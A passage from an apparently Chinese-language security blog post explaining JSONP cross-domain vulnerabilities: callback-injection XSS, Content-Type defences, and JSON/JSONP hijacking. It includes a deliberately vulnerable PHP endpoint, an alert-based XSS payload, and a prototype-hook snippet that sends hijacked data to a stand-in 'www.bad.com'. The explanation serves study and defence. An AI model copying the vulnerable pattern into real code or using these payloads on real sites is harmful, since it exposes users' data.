class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"here"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">callbackFunction</span><span class="params">(result, methodName)</span></span></span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> html = <span class="string">'&lt;ul&gt;'</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.length; i++)</span></span><br><span class="line"><span class="undefined">    &#123;</span></span><br><span class="line"><span class="actionscript">        html += <span class="string">'&lt;li&gt;'</span> + result[i] + <span class="string">'&lt;/li&gt;'</span>;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="actionscript">    html += <span class="string">'&lt;/ul&gt;'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">'here'</span>).innerHTML = html;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.17.166:81/jsonp.php?callback=callbackFunction"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接在访问本地服务器的jsonp.html，看到其跨域访问JSONP端点获取并解析JSONP数据，显示到页面中：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/7.png" alt=""></p><h4 id="Jquery的三种形式"><a href="#Jquery的三种形式" class="headerlink" title="Jquery的三种形式"></a>Jquery的三种形式</h4><h5 id="getJSON"><a href="#getJSON" class="headerlink" title="$.getJSON"></a>$.getJSON</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"here"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$.getJSON(<span class="string">"http://192.168.17.166:81/jsonp.php?callback=?"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> html = <span class="string">'&lt;ul&gt;'</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span></span><br><span class="line"><span class="undefined">    &#123;</span></span><br><span class="line"><span class="actionscript">        html += <span class="string">'&lt;li&gt;'</span> + data[i] + <span class="string">'&lt;/li&gt;'</span>;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="actionscript">    html += <span class="string">'&lt;/ul&gt;'</span>;</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#here'</span>).html(html); </span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="ajax"><a href="#ajax" class="headerlink" title="$.ajax"></a>$.ajax</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"here"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span></span><br><span class="line"><span class="actionscript"><span class="comment">// 使用ajax来调用jsonp  </span></span></span><br><span class="line"><span class="javascript">$.ajax(&#123;  </span></span><br><span class="line"><span class="actionscript">type: <span class="string">"get"</span>, <span class="comment">//jsonp默认为get请求，即使写post也会转换成get方式  </span></span></span><br><span class="line"><span class="javascript"><span class="keyword">async</span>: <span class="literal">false</span>, <span class="comment">// jsonp默认为false，即使写true也会转换成false  </span></span></span><br><span class="line"><span class="actionscript">url: <span class="string">"http://192.168.17.166:81/jsonp.php"</span>, <span class="comment">// 服务端地址  </span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// data: &#123;"code" : "CA1405"&#125;, // 入参  </span></span></span><br><span class="line"><span class="actionscript">dataType: <span class="string">"jsonp"</span>, <span class="comment">// jsonp调用固定写法  </span></span></span><br><span class="line"><span class="actionscript">jsonp: <span class="string">"callback"</span>, <span class="comment">// 传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)。即：?callback=xxx中的callback部分  </span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// jsonpCallback:"flightHandler",//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写"?"，jQuery会自动为你处理数据。即：?callback=xxx中的xxx部分  </span></span></span><br><span class="line"><span class="actionscript">success: <span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>&#123; <span class="comment">// 调用成功之后的方法  </span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> html = <span class="string">'&lt;ul&gt;'</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="actionscript">    html += <span class="string">'&lt;li&gt;'</span> + data[i] + <span class="string">'&lt;/li&gt;'</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript">html += <span class="string">'&lt;/ul&gt;'</span>;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'#here'</span>).html(html); </span></span><br><span class="line"><span class="undefined">&#125;,  </span></span><br><span class="line"><span class="actionscript">error: <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; <span class="comment">// 调用失败之后的方法  </span></span></span><br><span class="line"><span class="actionscript">    alert(<span class="string">'error'</span>);  </span></span><br><span class="line"><span class="undefined">&#125;  </span></span><br><span class="line"><span class="undefined">&#125;);  </span></span><br><span class="line"><span class="undefined">&#125;); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="get"><a href="#get" class="headerlink" title="$.get"></a>$.get</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"here"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$.get(<span class="string">'http://192.168.17.166:81/jsonp.php?callback=?'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123; <span class="keyword">var</span> html = <span class="string">'&lt;ul&gt;'</span>;<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++)&#123;html += <span class="string">'&lt;li&gt;'</span> + data[i] + <span class="string">'&lt;/li&gt;'</span>;&#125;html += <span class="string">'&lt;/ul&gt;'</span>;$(<span class="string">'#here'</span>).html(html);  &#125;, <span class="string">'jsonp'</span>);  </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-JSONP跨域漏洞"><a href="#0x02-JSONP跨域漏洞" class="headerlink" title="0x02 JSONP跨域漏洞"></a>0x02 JSONP跨域漏洞</h2><p>JSONP跨域漏洞主要是callback自定义导致的XSS和JSONP劫持。</p><h3 id="callback自定义导致的XSS"><a href="#callback自定义导致的XSS" class="headerlink" title="callback自定义导致的XSS"></a>callback自定义导致的XSS</h3><p>我们知道，在JSONP跨域中，我们是可以传入一个函数名的参数如callback，然后JSONP端点会根据我们的传参动态生成JSONP数据响应回来。</p><p>如果JSONP端点对于用于传入的函数名参数callback处理不当，如未正确设置响应包的Content-Type、未对用户输入参数进行有效过滤或转义时，就会导致XSS漏洞的产生。</p><h4 id="未设置Content-Type且未过滤"><a href="#未设置Content-Type且未过滤" class="headerlink" title="未设置Content-Type且未过滤"></a>未设置Content-Type且未过滤</h4><p>我们先看下默认情况下未设置Content-Type且未对callback参数进行过滤的场景，这种情形是最基础也是最常见的，网上大多数的JSONP引起的XSS都是这种场景的。</p><p>JSONP端点的代码如下，data.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'callback'</span>]))&#123;</span><br><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line"><span class="keyword">print</span> $callback.<span class="string">'(&#123;"username" : "mi1k7ea", "password" : "thisispassword"&#125;);'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'No callback param.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常访问会在页面返回JSONP数据：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/9.png" alt=""></p><p>当输入XSS payload<code>callback=hello&lt;script&gt;alert(0)&lt;/script&gt;</code>时，会弹框，且可以看到响应报文在未设置Content-Type情况下其值为text/html：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/10.png" alt=""></p><h4 id="几种Content-Type设置探讨"><a href="#几种Content-Type设置探讨" class="headerlink" title="几种Content-Type设置探讨"></a>几种Content-Type设置探讨</h4><p>接着我们探讨下几种不同的Content-Type是否会造成XSS。</p><h5 id="application-json"><a href="#application-json" class="headerlink" title="application/json"></a>application/json</h5><p>查阅资料发现：JSON文本的MIME媒体类型是application/json，默认编码为UTF-8。同时这也是建议的JSONP端点设置的Content-Type值，用于防御XSS。</p><p>我们直接在前面data.php中添加设置Header字段的代码即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'callback'</span>]))&#123;</span><br><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line"><span class="keyword">print</span> $callback.<span class="string">'(&#123;"username" : "mi1k7ea", "password" : "thisispassword"&#125;);'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'No callback param.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时无论正常访问还是注入XSS payload，页面都不会显示内容出来：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/11.png" alt=""></p><p>但我们在浏览器查看原始数据的时候是有JSONP数据返回的，但就是不会在页面中解析该内容：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/12.png" alt=""></p><p>这种情形，在哪个浏览器尝试都不会弹框，因为此时浏览器不再将响应返回内容当成HTML文档来解析了，而是将其视为JSON数据，但由于该数据是JSONP格式的而不是JSON格式的，当浏览器尝试解析JSON数据时会报错。然而这一切如果只是在几个文件或接口之间JSONP数据的调用，则是不会有问题的，因为它不需要浏览器显示出来而只是取其中的数据而已。</p><h5 id="text-json"><a href="#text-json" class="headerlink" title="text/json"></a>text/json</h5><p>text/json是application/json正式注册之前，JSON的实验版MIME类型。</p><p>将data.php中对应的字段值改为text/json，再访问，可以看到页面原封不动地返回数据，但浏览器不会解析其中的内容，不会弹框：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/13.png" alt=""></p><p>这种情形处理会将响应内容显示在页面上，但浏览器同样不会将该内容当成HTML文档来解析，同时也没有去按JSON格式解析内容，因此没有报错。</p><h5 id="application-javascript与text-javascript"><a href="#application-javascript与text-javascript" class="headerlink" title="application/javascript与text/javascript"></a>application/javascript与text/javascript</h5><p>其实，JSONP格式的数据就是JS数据，其返回的内容就是传入参数的JS函数的调用。</p><p>application/javascript是JavaScript的正式注册的MIME媒体类型。</p><p>因此，可能会有些程序员在设置Content-Type时，会将其设置为application/javascript，将响应的JSONP内容正确地设置为JS类型。</p><p>我们修改data.php中对应的Content-Type值为application/javascript再看看，在Chrome和Firefox下确实没有弹框：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/14.png" alt=""></p><p>但是换到非最新版的IE就会弹了，我本地IE更新到最新的只是提示是否下载该文件而已。</p><p>另外，text/javascript的效果是一样的，其是application/javascript的测试版。</p><h5 id="X-Content-Type-Options"><a href="#X-Content-Type-Options" class="headerlink" title="X-Content-Type-Options"></a>X-Content-Type-Options</h5><p>如果在响应报文中X-Content-Type-Options字段被设置为nosniff，Content-Type必须设置为JavaScript（application/javascript或text/javascript）才能在浏览器中运行。</p><p>这是因为在响应中包含回调产生的问题，这时响应不再解析JSON而是解析JS。</p><h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>JSONP劫持其实和CSRF的攻击是类似的，只不过CSRF是提交表单请求，而JSONP劫持是将请求JSONP端点获取到的JSONP数据发往攻击者服务器中、实现获取JSONP敏感信息。</p><p>因此，JSONP劫持的前提和CSRF是一样的，当服务端没有校验请求来源，如未严格校验Referer或未存在token机制等，都会导致JSONP劫持的产生。</p><p>我们经常会听到JSON劫持和JSONP劫持，两者有啥区别，下面简单说下。</p><h4 id="JSON劫持与JSONP劫持"><a href="#JSON劫持与JSONP劫持" class="headerlink" title="JSON劫持与JSONP劫持"></a>JSON劫持与JSONP劫持</h4><p>简单地说，JSONP劫持属于JSON劫持的一种。</p><h5 id="JSON劫持"><a href="#JSON劫持" class="headerlink" title="JSON劫持"></a>JSON劫持</h5><p>JSON劫持即JSON Hijacking，攻击过程类似CSRF，区别在于CSRF只管发送表单请求，但是JSON劫持则是获取JSON格式的敏感数据。 </p><p>通常，有些Web应用会把一些敏感数据以JSON形式返回到前端，如果仅仅通过cookie来判断请求是否合法，那么就可以利用类似CSRF的手段，向目标服务器发送请求，以获得敏感数据。</p><p>当JSON数据响应给网站时，浏览器立即会调用数组或者对象的构造函数。正是利用这一点，把构造方法替换成恶意代码，在构造方法中添加将JSON数据发送给第三方即攻击者的代码。</p><p>下面结合简单的示例讲下JSON劫持的原理，参考自<a href="https://blog.spoock.com/" target="_blank" rel="noopener">Spoock</a>。</p><p>比如目标站点存在可直接访问JSON数据，其可通过GET请求如<code>www.good.com/user/mail.json</code>来进行访问，同时这个请求没有对用户的身份进行严格的认证，那么当用户访问一个恶意站点的时候，恶意站点同样包含获取<code>www.good.com/user/mail.json</code>的GET请求，再通过JSON劫持的方式就可以获取到用户的敏感JSON数据，然后发送到恶意的站点。</p><p>整个过程的流程图如下所示：</p><p><img src="/2019/08/20/JSONP跨域漏洞总结/8.png" alt=""></p><p>关键的步骤是第4步和第7步。当用户访问恶意站点之后，从正常站点将JSON数据下载下来之后，如何发送到恶意站点上去。</p><p>这里，我们的恶意页面仅仅是通过script标签的src属性进行导入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"www.good.com/data.json"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建data.json文件如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"fname"</span>:<span class="string">"Mi1k"</span>,</span><br><span class="line"><span class="attr">"lname"</span>:<span class="string">"7ea"</span>,</span><br><span class="line"><span class="attr">"phone"</span>:<span class="string">"666666"</span>,</span><br><span class="line"><span class="attr">"email"</span>:<span class="string">"mi1k7ea@163.com"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当用户在已登录目标站点并保持着Cookie有效的情况下，被诱使访问了我们的恶意页面，就会导致请求目标敏感JSON文件。</p><p>JSON数据从服务器端到达浏览器之后，会被浏览器解析为JavaScript中的Object的实例。在这种情况下，只要重写Object类的set方法，就可以获取到想要的数据，这就是JSON劫持的实现，以下就是攻击代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype,<span class="string">"email"</span>,&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">set</span>:<span class="function"><span class="keyword">function</span><span class="params">(obj)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// send data to www.bad.com</span></span></span><br><span class="line"><span class="undefined">        senddata2badsute(obj)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"www.good.com/data.json"</span>/&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure><blockquote><p>我们为Object类的email属性设置一个Hook函数。在JavaScript中所有的类都是继承至Object类，所以defineProperty()这个方法为所有的对象的email属性都增加了一个Hook函数。当有对象设置email属性的时候，就会运行上面这段代码。所以当浏览器获取到了json数据，要将json数据转化为JavaScript对象的时候，由于json数据中存在email属性的设置，此时就会触发Hook函数，而这个函数就会将数据传送到攻击者。这个过程就完成了json数据的劫持了。</p><p>PS:目前网络上关于这方面的资料大部分都是2012年之前的，此时我尝试进行重新的时候，发现已经无法实现了。<strong>说明浏览器目前已经修复了这个漏洞</strong>。关于hook对象的属性设置目前的实现方法与之前的方法也相同了。</p></blockquote><p>我们本地试下就知道了，当我们通过.属性的方式赋值时是会弹框的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype,<span class="string">"Id"</span>,&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">set</span>:<span class="function"><span class="keyword">function</span><span class="params">(obj)</span> </span>&#123;</span></span><br><span class="line"><span class="undefined">        alert(obj);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Object</span>();</span></span><br><span class="line"><span class="undefined">a.Id = 666;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是如果我们是直接声明并且赋值给一个对象，这个时候就不会触发这个事件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype,<span class="string">"Id"</span>,&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">set</span>:<span class="function"><span class="keyword">function</span><span class="params">(obj)</span> </span>&#123;</span></span><br><span class="line"><span class="undefined">        alert(obj);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> b=&#123;<span class="string">"Id"</span>:<span class="number">123</span>&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而由目标JSON端点返回的数据都是{‘a’:’b’}的形式，即我们恶意页面接收到JSON数据时在script标签是通过直接声明并且赋值的形式来赋值给对象的，从而也不会导致弹框。换句话说，就是现在的浏览器已经对这种JSON劫持漏洞进行了防御，我们没有办法通过Hook JS函数来实现JSON劫持了。</p><p><strong>小结一下</strong></p><p>当用户在已登录目标站点并保持着Cookie有效的情况下，被诱使访问了我们的恶意页面，而恶意页面是向目标JSON文件发起请求并获取响应；</p><p>因为script标签会自动解析请求回来的JSON数据并生成对应的JS对象，此时我们只需要再通过<code>Object.prototype.__defineSetter__</code>这个函数来进行Hook，就能实现将获取到的JSON数据往外发送给攻击者，从而成功导致JSON劫持；</p><p>但是该函数在当前的新版本chrome和firefox中都已经失效了，浏览器早已对此JSON劫持漏洞进行了修补。</p><h5 id="JSONP劫持-1"><a href="#JSONP劫持-1" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h5><p>前面JSON劫持的通用方法其实已经早已被浏览器防御住了，但由于JSONP的出现，导致JSON劫持多了一种JSONP的形式，这是因为JSONP数据其实就是往JS函数中传参进行调用，这就导致了攻击者在恶意页面编写恶意的JS函数，通过JSONP的调用来执行该恶意JS函数、将敏感JSONP数据发往攻击者服务器中。</p><p>具体的看下面的Demo即可。</p><h4 id="Demo1——窃取用户信息"><a href="#Demo1——窃取用户信息" class="headerlink" 